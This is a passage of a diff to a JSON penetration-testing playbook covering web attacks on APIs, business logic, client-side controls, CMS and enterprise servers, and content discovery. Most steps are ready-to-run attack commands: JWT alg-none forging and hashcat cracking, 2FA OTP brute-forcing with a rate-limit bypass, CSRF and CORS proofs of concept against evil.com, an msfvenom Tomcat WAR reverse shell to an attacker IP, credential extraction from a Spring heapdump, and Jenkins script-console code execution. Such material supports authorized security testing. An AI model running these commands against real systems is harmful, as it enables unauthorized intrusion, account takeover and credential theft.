+        "phase": "enumeration",
+        "purpose": "Query GraphQL endpoint for full schema definitions, available mutations, internal queries, and hidden administrative types.",
+        "command": "curl -s -X POST http://{{TARGET}}:{{PORT|80}}/graphql -H 'Content-Type: application/json' -d '{\"query\":\"query { __schema { types { name fields { name } } } }\"}' | jq .",
+        "expected_output": [
+          "{\"data\": {\"__schema\": {\"types\": [{\"name\": \"User\", \"fields\": [...]}]}}}"
+        ],
+        "common_mistakes": [
+          "Try common GraphQL endpoints if /graphql fails: /api/graphql, /v1/graphql, /query, /api."
+        ],
+        "if_success": "Schema dump obtained! Analyze types and mutations for unauthorized actions (e.g. deleteUser, updateRole).",
+        "if_failure": "Introspection disabled by configuration. Try field suggestion fuzzing with clairvoyance or inql.",
+        "references": [
+          "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql"
+        ]
+      },
+      {
+        "id": "api-jwt-tampering-none-alg",
+        "title": "JWT Algorithm None & Secret Key Cracking",
+        "phase": "exploitation",
+        "purpose": "Test JSON Web Tokens for alg none signature bypasses, weak HMAC secrets, and privilege claim tampering (role admin).",
+        "command": "jwt_tool {{JWT_TOKEN}} -X a; hashcat -m 16500 -a 0 '{{JWT_TOKEN}}' /usr/share/wordlists/rockyou.txt",
+        "expected_output": [
+          "[+] Vulnerability Found: alg: none accepted by server!",
+          "{{JWT_TOKEN}}:secret123"
+        ],
+        "common_mistakes": [
+          "When testing alg: none, try none, None, NONE, and nOnE with empty signature trailing dot (header.payload.)."
+        ],
+        "if_success": "Signature bypassed or HMAC key cracked! Forge token with role admin, is_admin true.",
+        "if_failure": "Server strictly verifies RS256/ES256 signatures. Check JWKS injection or key confusion attacks.",
+        "references": [
+          "https://github.com/ticarpi/jwt_tool",
+          "https://portswigger.net/web-security/jwt"
+        ]
+      },
+      {
+        "id": "api-bola-idor-testing",
+        "title": "Broken Object Level Authorization (BOLA / IDOR)",
+        "phase": "exploitation",
+        "purpose": "Test API resource identifiers (/api/v1/users/{id}, /api/v1/orders/{orderId}) with horizontal and vertical privilege escalation IDs.",
+        "command": "curl -s -H 'Authorization: Bearer {{AUTH_TOKEN}}' http://{{TARGET}}:{{PORT|80}}/api/v1/users/1; curl -s -H 'Authorization: Bearer {{AUTH_TOKEN}}' http://{{TARGET}}:{{PORT|80}}/api/v1/users/2",
+        "expected_output": [
+          "{\"id\": 1, \"username\": \"admin\", \"email\": \"admin@corp.local\", \"role\": \"superadmin\"}"
+        ],
+        "common_mistakes": [
+          "If integer IDs are rejected, test GUIDs, email addresses, or base64 decoded parameters."
+        ],
+        "if_success": "Unauthorized access to other users data confirmed (BOLA)!",
+        "if_failure": "Endpoint enforces strict ownership checks. Test PUT/DELETE methods for mutation bypasses.",
+        "references": [
+          "https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "business-logic",
+    "name": "Business Logic Vulnerabilities & Race Conditions",
+    "category": "web",
+    "description": "Advanced assessment methodology for business logic flaws, race conditions (time-of-check to time-of-use), payment and price manipulation, multi-step workflow bypasses, and 2FA authentication flaws.",
+    "port_triggers": [
+      80,
+      443,
+      8080,
+      8443
+    ],
+    "tags": [
+      "business-logic",
+      "race-conditions",
+      "2fa-bypass",
+      "price-manipulation",
+      "workflow-bypass"
+    ],
+    "steps": [
+      {
+        "id": "logic-race-conditions-turbo",
+        "title": "Race Condition / Concurrency Testing (Turbo Intruder)",
+        "phase": "exploitation",
+        "purpose": "Send concurrent HTTP requests synchronized to the exact same millisecond using HTTP/2 multiplexing or TCP packet alignment to exploit race windows (e.g. redeeming coupon multiple times or double spending).",
+        "command": "python3 -c \"import requests, threading\ndef req(): requests.post('http://{{TARGET}}:{{PORT|80}}/api/redeem', json={'code':'DISCOUNT2026'}, headers={'Cookie':'{{SESSION_COOKIE}}'})\nthreads = [threading.Thread(target=req) for _ in range(30)]\nfor t in threads: t.start()\nfor t in threads: t.join()\"",
+        "expected_output": [
+          "[+] Multiple requests succeeded with 200 OK before state change was locked!"
+        ],
+        "common_mistakes": [
+          "For best results with sub-millisecond precision, use Burp Suite Turbo Intruder single-packet attack."
+        ],
+        "if_success": "Race condition validated! Balances or limits bypassed via simultaneous requests.",
+        "if_failure": "Backend implements atomic database transactions (SELECT FOR UPDATE) or distributed locks.",
+        "references": [
+          "https://portswigger.net/web-security/race-conditions"
+        ]
+      },
+      {
+        "id": "logic-2fa-otp-bruteforce",
+        "title": "Two-Factor Authentication (2FA) OTP Bypass & Spraying",
+        "phase": "exploitation",
+        "purpose": "Test for missing rate-limiting on 4-to-6 digit 2FA/OTP verification codes, response manipulation, or direct endpoint forced browsing.",
+        "command": "ffuf -u http://{{TARGET}}:{{PORT|80}}/verify-2fa -X POST -H 'Content-Type: application/json' -H 'Cookie: {{SESSION_COOKIE}}' -d '{\"otp\":\"FUZZ\"}' -w <(seq -w 0000 9999) -mc 200,302 -t 50",
+        "expected_output": [
+          "[302] OTP: 4892 -> Redirect /dashboard"
+        ],
+        "common_mistakes": [
+          "If rate limiting is enforced per IP, try headers X-Forwarded-For: 127.0.0.1 or rotate IP addresses."
+        ],
+        "if_success": "2FA bypassed! Full account takeover completed without user authenticator device.",
+        "if_failure": "Rate limiting blocks after 5 attempts. Test for response manipulation in Burp Proxy.",
+        "references": [
+          "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/2fa-bypass"
+        ]
+      },
+      {
+        "id": "logic-parameter-price-tampering",
+        "title": "Price & Negative Quantity Manipulation",
+        "phase": "exploitation",
+        "purpose": "Tamper with e-commerce parameters to induce business calculation errors or checkout for free.",
+        "command": "curl -s -X POST http://{{TARGET}}:{{PORT|80}}/cart/add -H 'Content-Type: application/json' -H 'Cookie: {{SESSION_COOKIE}}' -d '{\"item_id\": 42, \"price\": 0.01, \"quantity\": 1}'",
+        "expected_output": [
+          "{\"status\": \"success\", \"total_price\": 0.01}"
+        ],
+        "common_mistakes": [
+          "Test array parameters, negative quantities (quantity -1), and currency mismatches."
+        ],
+        "if_success": "Server trusted client-side pricing or accepted negative numbers!",
+        "if_failure": "Price verified against server database. Test coupon stacking logic.",
+        "references": [
+          "https://portswigger.net/web-security/logic-flaws"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "client-side",
+    "name": "Client-Side Security (CORS, CSRF, Clickjacking & WebSockets)",
+    "category": "web",
+    "description": "Audit client-side web application security controls including Cross-Origin Resource Sharing (CORS) misconfigurations, Cross-Site Request Forgery (CSRF), Clickjacking (X-Frame-Options), and WebSocket security (CSWSH).",
+    "port_triggers": [
+      80,
+      443,
+      8080,
+      8443
+    ],
+    "tags": [
+      "cors",
+      "csrf",
+      "clickjacking",
+      "websocket",
+      "cswsh",
+      "client-side"
+    ],
+    "steps": [
+      {
+        "id": "client-cors-misconfiguration",
+        "title": "CORS Origin Reflection & Null Origin Audit",
+        "phase": "enumeration",
+        "purpose": "Test whether the API reflects arbitrary Origin headers with Access-Control-Allow-Credentials true or accepts Origin null allowing cross-origin data extraction.",
+        "command": "curl -s -I -X GET http://{{TARGET}}:{{PORT|80}}/api/user/profile -H 'Origin: https://evil.com' -H 'Cookie: {{SESSION_COOKIE}}'; curl -s -I -X GET http://{{TARGET}}:{{PORT|80}}/api/user/profile -H 'Origin: null' -H 'Cookie: {{SESSION_COOKIE}}'",
+        "expected_output": [
+          "Access-Control-Allow-Origin: https://evil.com",
+          "Access-Control-Allow-Credentials: true"
+        ],
+        "common_mistakes": [
+          "Ensure you test authenticated endpoints where private PII or API tokens are returned."
+        ],
+        "if_success": "Critical CORS misconfiguration found! Host exploit PoC on attacker server to exfiltrate user data.",
+        "if_failure": "Origin strictly whitelisted. Test prefix/suffix bypasses.",
+        "references": [
+          "https://portswigger.net/web-security/cors"
+        ]
+      },
+      {
+        "id": "client-csrf-poc-generation",
+        "title": "Cross-Site Request Forgery (CSRF) PoC",
+        "phase": "exploitation",
+        "purpose": "Verify if state-changing POST/PUT requests lack anti-CSRF tokens and lack SameSite=Strict/Lax cookie flags.",
+        "command": "cat << 'EOF' > csrf_poc.html\n<html>\n  <body>\n    <h1>CSRF PoC</h1>\n    <form action=\"http://{{TARGET}}:{{PORT|80}}/api/email/change\" method=\"POST\">\n      <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n    <script>document.forms[0].submit();</script>\n  </body>\n</html>\nEOF\npython3 -m http.server 8000",
+        "expected_output": [
+          "Serving HTTP on 0.0.0.0 port 8000 ..."
+        ],
+        "common_mistakes": [
+          "If endpoint accepts JSON, test if content-type can be relaxed or if CORS preflight is bypassed (text/plain or multipart)."
+        ],
+        "if_success": "Target account email or password modified upon victim visiting attacker page!",
+        "if_failure": "Protected by CSRF tokens or SameSite=Lax.",
+        "references": [
+          "https://portswigger.net/web-security/csrf"
+        ]
+      },
+      {
+        "id": "client-websocket-cswsh",
+        "title": "Cross-Site WebSocket Hijacking (CSWSH) & Injection",
+        "phase": "exploitation",
+        "purpose": "Test if WebSocket handshake relies solely on session cookies without verifying the Origin header, enabling cross-origin WebSocket message interception.",
+        "command": "wscat -c ws://{{TARGET}}:{{PORT|80}}/ws/chat --header 'Origin: https://evil.com' --header 'Cookie: {{SESSION_COOKIE}}'",
+        "expected_output": [
+          "Connected (press CTRL+C to quit)",
+          "< {\"type\": \"history\", \"messages\": [...]}"
+        ],
+        "common_mistakes": [
+          "Use wss:// for TLS encrypted WebSocket endpoints."
+        ],
+        "if_success": "WebSocket connection established with arbitrary Origin! Steal real-time notifications or chat transcripts.",
+        "if_failure": "Server rejected connection due to mismatched Origin header or missing CSRF token in handshake query.",
+        "references": [
+          "https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "cms-frameworks",
+    "name": "CMS, Frameworks & Enterprise Apps (WordPress, Tomcat, Jenkins, Spring)",
+    "category": "web",
+    "description": "Targeted attack vectors for common CMS platforms (WordPress, Joomla, Drupal), Java application servers (Tomcat, WebLogic), CI/CD pipelines (Jenkins), and modern frameworks (Spring Boot, Laravel).",
+    "port_triggers": [
+      80,
+      443,
+      8080,
+      8443,
+      8000,
+      8088
+    ],
+    "tags": [
+      "cms",
+      "wordpress",
+      "tomcat",
+      "jenkins",
+      "spring-boot",
+      "laravel",
+      "wpscan"
+    ],
+    "steps": [
+      {
+        "id": "cms-wordpress-wpscan",
+        "title": "WordPress Vulnerability & Plugin Audit (WPScan)",
+        "phase": "enumeration",
+        "purpose": "Enumerate WordPress version, vulnerable active plugins, theme vulnerabilities, and valid usernames via WPScan.",
+        "command": "wpscan --url http://{{TARGET}}:{{PORT|80}}/ --enumerate p,t,u --api-token {{WPSCAN_API_TOKEN}} --plugins-detection aggressive",
+        "expected_output": [
+          "[+] WordPress version 5.8 identified",
+          "[!] 3 vulnerabilities found for plugin: wp-file-manager"
+        ],
+        "common_mistakes": [
+          "Free WPScan API tokens provide CVE descriptions. Without a token, only public component detection runs."
+        ],
+        "if_success": "Vulnerable plugin or user list found! Search Exploit-DB or spray passwords (`wpscan --passwords rockyou.txt`).",
+        "if_failure": "WordPress not detected or XML-RPC blocked.",
+        "references": [
+          "https://github.com/wpscanteam/wpscan"
+        ]
+      },
+      {
+        "id": "cms-tomcat-war-upload",
+        "title": "Apache Tomcat Manager WAR Reverse Shell Deployment",
+        "phase": "exploitation",
+        "purpose": "Authenticate to Tomcat Web Application Manager (`/manager/html`) with default credentials and deploy a malicious `.war` package containing a Java JSP reverse shell.",
+        "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={{ATTACKER_IP}} LPORT=4444 -f war -o shell.war && curl -u '{{USERNAME|tomcat}}:{{PASSWORD|s3cret}}' -T shell.war \"http://{{TARGET}}:{{PORT|8080}}/manager/text/deploy?path=/shell&update=true\"",
+        "expected_output": [
+          "OK - Deployed application at context path [/shell]"
+        ],
+        "common_mistakes": [
+          "Tomcat manager requires `manager-gui` or `manager-script` role."
+        ],
+        "if_success": "Reverse shell deployed! Trigger with `curl http://{{TARGET}}:{{PORT|8080}}/shell/` with a netcat listener running on port 4444.",
+        "if_failure": "Tomcat manager credentials invalid. Password spray `/manager/html` with `tomcat`, `admin`, `role1`, `root`.",
+        "references": [
+          "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat"
+        ]
+      },
+      {
+        "id": "cms-spring-boot-actuators",
+        "title": "Spring Boot Actuator HeapDump & Env Exploitation",
+        "phase": "exploitation",
+        "purpose": "Query exposed Spring Boot Actuator endpoints (`/actuator/heapdump`, `/actuator/env`, `/actuator/gateway`) to extract plaintext passwords or execute code via H2 RCE.",
+        "command": "curl -s http://{{TARGET}}:{{PORT|8080}}/actuator/env; curl -s -O http://{{TARGET}}:{{PORT|8080}}/actuator/heapdump; strings heapdump | grep -iE 'password|secret|key' | head -n 40",
+        "expected_output": [
+          "{\"propertySources\": [{\"name\": \"systemEnvironment\", \"properties\": {\"DB_PASSWORD\": {\"value\": \"******\"}}}]}",
+          "Cleartext database credentials recovered from memory heapdump strings"
+        ],
+        "common_mistakes": [
+          "In `/actuator/env`, passwords are masked with `******`. Download `/actuator/heapdump` to recover the unmasked plaintext strings."
+        ],
+        "if_success": "Database credentials or application secrets recovered!",
+        "if_failure": "Actuators protected or disabled (`management.endpoints.web.exposure.include=none`).",
+        "references": [
+          "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators"
+        ]
+      },
+      {
+        "id": "cms-jenkins-script-console-rce",
+        "title": "Jenkins Groovy Script Console Remote Code Execution",
+        "phase": "exploitation",
+        "purpose": "Execute arbitrary Groovy code as SYSTEM / root via the administrative Jenkins Script Console (`/script`).",
+        "command": "curl -s -X POST -u '{{USERNAME|admin}}:{{PASSWORD|admin}}' -d 'script=println+\"whoami\".execute().text' http://{{TARGET}}:{{PORT|8080}}/script",
+        "expected_output": [
+          "Result: nt authority\\system",
+          "Result: jenkins"
+        ],
+        "common_mistakes": [
+          "Requires CSRF crumb header if CSRF protection is enabled (`curl -s -u admin:password 'http://target:8080/crumbIssuer/api/json'`)."
+        ],
+        "if_success": "Remote command execution achieved! Spawn reverse shell using Groovy socket wrapper.",
+        "if_failure": "Jenkins requires administrative authentication or script console disabled.",
+        "references": [
+          "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/jenkins"
+        ]
+      }
+    ]
+  },
+  {
     "id": "command-injection",
     "name": "OS Command Injection & Filter Bypasses",
     "category": "web",
@@ -2906,6 +3876,85 @@
         "if_failure": "CGI script not vulnerable or bash patched. Check other web endpoints.",
         "references": [
           "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "content-discovery",
+    "name": "Web Content Discovery & Attack Surface Mapping",
+    "category": "web",
+    "description": "Modern methodology for discovering hidden web endpoints, virtual host subdomains (VHosts), hidden GET/POST parameters (Arjun), directory brute-forcing, and technology stack fingerprinting.",
+    "port_triggers": [
+      80,
+      443,
+      8080,
+      8443
+    ],
+    "tags": [
+      "content-discovery",
+      "ffuf",
+      "feroxbuster",
+      "arjun",
+      "vhosts",
+      "directory-bruteforce"
+    ],
+    "steps": [
+      {
+        "id": "content-ffuf-directory-discovery",
+        "title": "Recursive Directory & File Fuzzing (FFUF)",
+        "phase": "enumeration",
+        "purpose": "Discover hidden directories, configuration backups, administrative portals, and sensitive files using FFUF with extension matching.",
+        "command": "ffuf -u http://{{TARGET}}:{{PORT|80}}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -e .php,.html,.txt,.bak,.zip,.json,.config -mc 200,204,301,302,307,401,403 -recursion -recursion-depth 2 -t 40",
+        "expected_output": [
+          "[200] http://{{TARGET}}:{{PORT|80}}/admin (Size: 2450)",
+          "[200] http://{{TARGET}}:{{PORT|80}}/backup.zip (Size: 5120300)"
+        ],
+        "common_mistakes": [
+          "Filter default 404 response sizes or words with -fs or -fw to eliminate false positives."
+        ],
+        "if_success": "Hidden panels, backups, or endpoints found! Proceed to inspect sensitive assets.",
+        "if_failure": "WAF blocking rate. Reduce rate (-p 0.1) or switch to Feroxbuster.",
+        "references": [
+          "https://github.com/ffuf/ffuf"
+        ]
+      },
+      {
+        "id": "content-vhost-subdomain-fuzzing",
+        "title": "Virtual Host (VHost) Discovery with Filtering",
+        "phase": "reconnaissance",
+        "purpose": "Fuzz the HTTP Host header to discover internal virtual hosts and hidden tenant subdomains mapped on the same IP.",
+        "command": "ffuf -u http://{{TARGET}}:{{PORT|80}}/ -H 'Host: FUZZ.{{DOMAIN|corp.local}}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs {{DEFAULT_404_SIZE|154}}",
+        "expected_output": [
+          "[200] Host: dev.corp.local (Size: 3840)",
+          "[200] Host: internal-api.corp.local (Size: 820)"
+        ],
+        "common_mistakes": [
+          "You MUST filter the default response size (-fs) or word count (-fw) representing the default catch-all page."
+        ],
+        "if_success": "Discovered valid virtual host! Add to /etc/hosts and scan web application.",
+        "if_failure": "No virtual hosts detected. Ensure testing both HTTP and HTTPS.",
+        "references": [
+          "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web#vhost-discovery"
+        ]
+      },
+      {
+        "id": "content-arjun-param-discovery",
+        "title": "Hidden GET/POST Parameter Discovery (Arjun)",
+        "phase": "enumeration",
+        "purpose": "Automatically discover hidden, unlinked GET/POST parameters on web endpoints that may trigger debug features, command execution, or SQL injection.",
+        "command": "arjun -u http://{{TARGET}}:{{PORT|80}}/index.php -m GET,POST -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 20",
+        "expected_output": [
+          "[+] Valid parameter found: debug (GET)",
+          "[+] Valid parameter found: file (POST)"
+        ],
+        "common_mistakes": [
+          "Test JSON parameter mode (-m JSON) on API routes."
+        ],
+        "if_success": "Hidden parameters found! Test for LFI, Command Injection, or SQL Injection.",
+        "if_failure": "No parameters found on entry script. Test individual discovered sub-paths.",
+        "references": [
+          "https://github.com/s0md3v/Arjun"
         ]
       }
     ]
